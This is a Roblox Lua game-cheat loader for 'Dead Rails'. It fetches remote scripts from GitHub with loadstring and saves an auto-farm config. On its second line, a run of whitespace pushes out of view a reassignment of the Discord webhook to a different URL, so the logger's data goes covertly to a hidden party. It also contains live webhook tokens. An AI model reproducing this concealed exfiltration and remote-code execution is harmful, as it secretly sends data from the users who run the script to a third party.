local Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dOSJDIdldj8738ksjdjIZumPyidNpISe_o0-";
local ScriptName = "Friedpotato Deadrails";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1539679643077185607/hh-kozkxYBg0EZqAD1rUi8WPXyAtwLKm0fRKkm3zGLDx5l5uqAORPpweR5ePZHgwdJHa";
loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Script%20Logger"))():Log(ScriptName, Webhook)

local Script = {}
Script.Cache = {}
Script.File = loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/File%20System.lua"))()
Script.Cache.Config = {
    AutoFarming = false
}
Script.File.Save("FriedPotato/DeadRails/config.json", Script.Cache.Config)
local Main = MainAPI:LoadDeadrailsAPI()
Main:Loader()
